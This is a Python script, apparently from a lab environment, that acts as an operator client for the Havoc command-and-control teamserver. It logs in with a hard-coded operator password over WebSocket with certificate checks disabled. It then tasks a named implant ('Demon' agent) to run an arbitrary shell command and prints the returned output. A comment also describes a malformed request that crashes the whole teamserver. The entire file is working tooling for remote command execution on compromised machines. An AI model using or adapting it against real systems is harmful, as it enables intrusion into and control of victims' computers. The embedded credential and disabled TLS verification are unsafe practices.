#!/usr/bin/env python3
"""Minimal Havoc operator WS client: authenticate + send one agent task.

Speaks the teamserver's JSON-over-WS protocol (see cmd/server/teamserver.go
ClientAuthenticate and cmd/server/dispatch.go):
  - InitConnection.Type=0x1 / OAuthRequest=0x3, Password = SHA3-256 hex
  - Session.Type=0x7 / Input=0x3 with Info{DemonID, Command, <params>, TaskID, CommandLine}

Usage: python3 havoc_operator.py <agent_nameid> <command...>
"""
import hashlib
import json
import ssl
import sys
import time

from websocket import create_connection  # websocket-client (in /opt/havoc-py/venv)

HOST = '127.0.0.1'
PORT = 40056
PATH = '/havoc/'
USER = 'admin'
PASSWORD = 'p9kblB6cNJ0ZO0c7KZ'  # from /root/Havoc/data/havoc.yaotl Operators


def main():
    nameid = sys.argv[1]
    cmdline = ' '.join(sys.argv[2:])

    ws = create_connection(f'wss://{HOST}:{PORT}{PATH}', timeout=10,
                           sslopt={'cert_reqs': ssl.CERT_NONE})

    def send(obj):
        ws.send(json.dumps(obj))

    # 1. authenticate (SHA3-256 of the yaotl password, hex).
    # NOTE: the teamserver asserts Info["User"].(string) — User must be in
    # Body.Info or it panics the whole Go process.
    pw = hashlib.sha3_256(PASSWORD.encode()).hexdigest()
    send({'Head': {'Event': 1, 'User': USER, 'Time': '', 'OneTime': ''},
          'Body': {'SubEvent': 3, 'Info': {'User': USER, 'Password': pw}}})

    # 2. task: shell command for the named agent
    send({'Head': {'Event': 7, 'User': USER, 'Time': '', 'OneTime': 'true'},
          'Body': {'SubEvent': 3,
                   'Info': {'DemonID': nameid,
                            'Command': 'shell',
                            'commands': cmdline,
                            'TaskID': f'task-{int(time.time())}',
                            'CommandLine': cmdline}}})
    print(f'[*] task sent to agent {nameid}: {cmdline!r}')

    # 3. listen for events (agent output broadcast) for a while
    ws.settimeout(25)
    end = time.time() + 25
    try:
        while time.time() < end:
            msg = ws.recv()
            try:
                data = json.loads(msg)
            except Exception:
                continue
            head, body = data.get('Head', {}), data.get('Body', {})
            info = body.get('Info', {}) if isinstance(body, dict) else {}
            blob = json.dumps(data)
            if 'Output' in blob or 'output' in blob or body.get('SubEvent') == 4:
                print('[=] EVENT:', blob[:600])
    except Exception as e:
        print(f'[!] listen ended: {e}')
    ws.close()


if __name__ == '__main__':
    main()
